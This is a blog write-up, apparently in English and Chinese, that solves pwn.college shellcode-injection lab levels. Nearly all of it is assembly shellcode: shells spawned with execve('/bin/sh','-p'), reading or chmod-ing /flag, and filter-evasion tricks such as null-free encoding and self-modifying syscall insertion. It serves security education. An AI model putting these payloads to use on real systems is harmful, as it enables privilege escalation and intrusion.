---
layout:	post
title:  "pwn.college: Shellcode Injection"
date: 2022-3-7 20:00
author: "Adam"
header-img: "img/post-bg-shellcode.jpg"
catalog: true
tags:
   - pwn.college
   - Shellcode
---
#### Level 0

```assembly
/* execve(path='/bin///sh', argv=['sh','-p'], envp=0) */
    /* push b'/bin///sh\x00' */
    push 0x68
    mov rax, 0x732f2f2f6e69622f
    push rax
    mov rdi, rsp
    /* push argument array ['sh\x00', '-p\x00'] */
    /* push b'sh\x00-p\x00' */
    mov rax, 0x101010101010101
    push rax
    mov rax, 0x101010101010101 ^ 0x702d006873
    xor [rsp], rax
    xor esi, esi /* 0 */
    push rsi /* null terminate */
    push 0xb
    pop rsi
    add rsi, rsp
    push rsi /* '-p\x00' */
    push 0x10
    pop rsi
    add rsi, rsp
    push rsi /* 'sh\x00' */
    mov rsi, rsp
    xor edx, edx /* 0 */
    /* call execve() */
    push SYS_execve /* 0x3b */
    pop rax
    syscall
```



#### Level 2

```assembly
mov rbx, 0x00000067616c662f	# push "/flag" filename
push rbx
mov rax, 2				# syscall number of open
mov rdi, rsp				# point the first argument at stack ("/flag").
mov rsi, 0				# NULL out the second argument (meaning, O_RDONLY).
syscall				# trigger open("/flag", NULL).

mov rdi, 1				# first argument to sendfile is the file descriptor to output to (stdout).
mov rsi, rax				# second argument is the file descriptor returned by open
mov rdx, 0				# third argument is the number of bytes to skip from the input file
mov r10, 1000				# fourth argument is the number of bytes to transfer to the output file
mov rax, 40				# syscall number of sendfile
syscall				# trigger sendfile(1, fd, 0, 1000).

mov rax, 60				# syscall number of exit
syscall				# trigger exit().
```



#### Level 3

This challenge requires that your shellcode have no NULL bytes!

`gcc -static -nostdlib file.s -o file.elf ; objcopy --dump-section .text=file.bin file.elf ; hd file.bin`

```assembly
.global _start
.intel_syntax noprefix
_start:
xor rax, rax
mov al, 0x67
shl rax, 0x20
xor rbx, rbx
mov ebx, 0x616c662f
add rbx, rax
push rbx
xor rax, rax
mov al, 2
mov rdi, rsp
xor rsi, rsi
syscall

xor rdi, rdi
inc rdi
mov rsi, rax
xor rdx, rdx
xor rax, rax
mov al, 0xff
mov r10, rax
xor rax, rax
mov al, 0x28
syscall

xor rax, rax
mov al, 0x3c
syscall
```

#### Level 4

This challenge requires that your shellcode have no H bytes!

不让用H就是说不能用64位的mov及相关的xor, or, shl指令，但是可以用32位指令，而且push和pop到rax不影响。

```assembly
/* execve(path='/bin///sh', argv=['sh','-p'], envp=0) */
    /* push b'/bin///sh\x00' */
    push 0x68
    //mov rax, 0x732f2f2f6e69622f
    //push rax
    push 0x6e69622f
    mov dword ptr [rsp+4],0x732f2f2f
    //mov rdi, rsp
    push rsp
    pop rdi
    /* push argument array ['sh\x00', '-p\x00'] */
    /* push b'sh\x00-p\x00' */
    //mov rax, 0x702d006873
    //push rax
    push 0x2d006873
    mov dword ptr [rsp+4],0x70
    xor esi, esi /* 0 */
    push rsi /* null terminate */
    //push 0xb
    //pop rsi
    //add rsi, rsp
    push rsp
    add dword ptr [rsp],0xb
    //pop rsi
    //push rsi /* '-p\x00' */
    //push 0x10
    //pop rsi
    //add rsi, rsp
    //push rsi /* 'sh\x00' */
    push rsp
    add dword ptr [rsp],0x10
    //mov rsi, rsp
    push rsp
    pop rsi
    xor edx, edx /* 0 */
    /* call execve() */
    push 0x3b /* 0x3b */
    pop rax
    syscall
```

#### Level 5

> This challenge requires that your shellcode does not have any `syscall`, 'sysenter', or `int` instructions. System calls are too dangerous! This filter works by scanning through the shellcode for the following byte sequences: 0f05(`syscall`), 0f34 (`sysenter`), and 80cd (`int`). One way to evade this is to have your shellcode modify itself to insert the `syscall` instructions at runtime.

```assembly
push 0x68
    mov rax, 0x732f2f2f6e69622f
    push rax
    mov rdi, rsp
    mov rax, 0x101010101010101
    push rax
    mov rax, 0x101010101010101 ^ 0x702d006873
    xor [rsp], rax
    xor esi, esi
    push rsi
    push 0xb
    pop rsi
    add rsi, rsp
    push rsi
    push 0x10
    pop rsi
    add rsi, rsp
    push rsi
    mov rsi, rsp
    xor edx, edx
    push 0x3b
    pop rax
    push 0x050e
    inc qword ptr [rsp]
    jmp rsp
    nop
```





#### Level 6

> This challenge requires that your shellcode does not have any `syscall`, 'sysenter', or `int` instructions. System calls are too dangerous! This filter works by scanning through the shellcode for the following byte sequences: 0f05(`syscall`), 0f34 (`sysenter`), and 80cd (`int`). One way to evade this is to have your shellcode modify itself to insert the `syscall` instructions at runtime.
>
> Removing write permissions from first 4096 bytes of shellcode.

```assembly
.rept 0x1000
    nop
    .endr
    push 0x68
    mov rax, 0x732f2f2f6e69622f
    push rax
    mov rdi, rsp
    mov rax, 0x101010101010101
    push rax
    mov rax, 0x101010101010101 ^ 0x702d006873
    xor [rsp], rax
    xor esi, esi
    push rsi
    push 0xb
    pop rsi
    add rsi, rsp
    push rsi
    push 0x10
    pop rsi
    add rsi, rsp
    push rsi
    mov rsi, rsp
    xor edx, edx
    push 0x3b
    pop rax
    push 0x050e
    inc qword ptr [rsp]
    jmp rsp
    nop
```

#### Level 7

> This challenge is about to close stdin, which means that it will be harder to pass in a stage-2 shellcode. You will need to figure an alternate solution (such as unpacking shellcode in memory) to get past complex filters.
>
> This challenge is about to close stderr, which means that you will not be able to get use file descriptor 2 for output.
>
> This challenge is about to close stdout, which means that you will not be able to get use file descriptor 1 for output. You will see no further output, and will need to figure out an alternate way of communicating data back to yourself.

```assembly
/* chmod(file='/flag', mode=4) */
/* push b'/flag\\x00' */
mov rax, 0x101010101010101
push rax
mov rax, 0x101010101010101 ^ 0x67616c662f
xor [rsp], rax
mov rdi, rsp
push 4
pop rsi /* call chmod() */
push SYS_chmod /* 0x5a */
pop rax
syscall
```

#### Level 8

> Reading 0x12 bytes from stdin.
>
>
> Removing write permissions from first 4096 bytes of shellcode.

这一题的意思是说要求我们的shellcode要在0x12字节以内。和上一题一样可以用chmod来做。linux有一个特性，chmod在操作软链接时不会作用于软链接，而会直接作用于所指向的文件，这样就不用输入`/flag`这5个字节了，只需要使用任意自定义一个字节即可。

` ln -s /flag f`

```assembly
/* chmod(file='f', mode=4) */
/* push b'f\x00' */
push 0x66
mov rdi, rsp
push 4
pop rsi
/* call chmod() */
push SYS_chmod /* 0x5a */
pop rax
syscall
```

新建一个名为`a`的脚本

``` shell
#!/bin/bash -p
id
cat /flag
```

使用`shellcraft.amd64.linux.execve('a')`获取汇编代码

```assembly
/* execve(path='a', argv=0, envp=0) */
/* push b'a\\x00' */
push 0x61
mov rdi, rsp
xor edx, edx /* 0 */
xor esi, esi /* 0 or cdq*/ 
/* call execve() */
mov al,0x3b 
syscall
```



#### Level 9

> This challenge modified your shellcode by overwriting every other 10 bytes with 0xcc. 0xcc, when interpreted as an
> instruction is an `INT 3`, which is an interrupt to call into the debugger. You must avoid these modifications in your
> shellcode.

每隔10字节就会用10个中断替换，用循环跳过就行了。

```assembly
push 0x66
mov rdi, rsp
push 4
pop rsi
jmp next
.rept 10
nop
.endr
/* call chmod() */
next:
push SYS_chmod /* 0x5a */
pop rax
syscall
```

#### Level 10

> This challenge just sorted your shellcode using bubblesort. Keep in mind the impact of memory endianness on this sort
> (e.g., the LSB being the right-most byte).
>
> This sort processed your shellcode 8 bytes at a time.

代码同level 9

#### Level 11

> This challenge is about to close stdin, which means that it will be harder to pass in a stage-2 shellcode. You will need
> to figure an alternate solution (such as unpacking shellcode in memory) to get past complex filters.

代码同level 9

#### Level 12

> This challenge requires that every byte in your shellcode is unique!

说实话这就有点强人所难了，像极了需要特殊解法的奥数题。具体做法就是用不同命令互相进行替换。用上面的代码即可

```assembly
		push 0x63
    mov rdi, rsp
    xor esi, esi
    cdq
    mov al,0x3b
    syscall

```



#### Level 13

> Reading 0xc bytes from stdin.

还是用上一题的代码。

#### Level 14

> Reading 0x6 bytes from stdin.

这一题直接又把空间砍了一半，推理一下其实可以想到肯定是已经帮我们做了一切工作，不然只用6字节肯定不够，所以说现在的任务就是确定哪些寄存器的值已经被设置好。


/* execve(path='/bin/sh', argv=['sh', '-p'], envp=0) */

push 0x1010101
xor dword ptr [esp], 0x169722e
push 0x6e69622f
mov ebx, esp\

push 0x70
push 0x1010101
xor dword ptr [esp], 0x2c016972
xor ecx, ecx
push ecx 
push 7
pop ecx
add ecx, esp
push ecx 
push 8
pop ecx
add ecx, esp
push ecx 
mov ecx, esp
xor edx, edx
push 0xb
pop eax
int 0x80

 /* execve(path='c', argv=0, envp=0) */
 /* push b'c\\x00' */
 push 0x63
 mov rdi, rsp
 xor edx, edx 
 xor esi, esi 
 push 0x3b 
 pop rax
syscall